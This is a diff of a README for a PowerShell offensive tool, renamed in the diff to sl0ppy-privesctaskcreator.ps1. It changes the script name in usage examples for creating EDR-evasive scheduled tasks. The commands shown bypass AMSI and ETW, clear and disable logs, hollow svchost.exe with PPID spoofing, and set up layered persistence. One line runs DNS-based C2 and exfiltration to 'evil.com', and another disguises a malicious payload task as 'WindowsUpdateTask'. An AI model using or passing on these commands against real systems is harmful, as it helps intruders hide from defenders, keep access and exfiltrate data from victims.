@@ -74,31 +74,31 @@ A PowerShell-based tool for creating highly customizable, EDR-evasive scheduled 
 ```
 * 🔹 Basic Execution
 * Run a PowerShell script with elevated privileges:
-.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1"
+.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Payloads\script.ps1"
 * 🔹 EDR Evasion Mode
 * Bypass AMSI, ETW, and use direct syscalls:
-.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" -BypassAMSI -BypassETW -UseDirectSyscalls
+.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Payloads\script.ps1" -BypassAMSI -BypassETW -UseDirectSyscalls
 * 🔹 Stealth Mode (Maximum OpSec)
-.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Payloads\script.ps1" `
 *     -Hidden -RandomizeName -AddJitter `
 *     -UseAlternateDataStream -Base64Encode `
 *     -BypassAMSI -BypassETW -AntiDebug -AntiVM `
 *     -ClearLogs -DisableLogging
 * 🔹 Process Injection
 Hollow svchost.exe and spoof PPID:
-.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Payloads\script.ps1" `
 *     -ProcessHollowing -HollowProcess "svchost.exe" `
 *     -PPIDSpoofing -SpoofedPPID 840
 * 🔹 Persistence Combo
-.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Payloads\script.ps1" `
 *     -WMIPersistence -RegistryPersistence `
 *     -ServicePersistence -SchTaskPersistence
 * 🔹 Network Evasion (C2 over DNS)
-.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
+.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Payloads\script.ps1" `
 *     -UseDNSExfil -C2Server "evil.com" -C2Port 53 `
 *     -UseProxy -ProxyAddress "192.168.1.100" -ProxyPort 8080
 * 🔹 Full Customization Example
-.\OmniTask.ps1 -FilePath "C:\Payloads\malicious.ps1" `
+.\sl0ppy-privesctaskcreator.ps1 -FilePath "C:\Payloads\malicious.ps1" `
 *     -CustTaskName "WindowsUpdateTask" `
 *     -Time (Get-Date).AddMinutes(15) `
 *     -RepeatInterval "PT1H" `
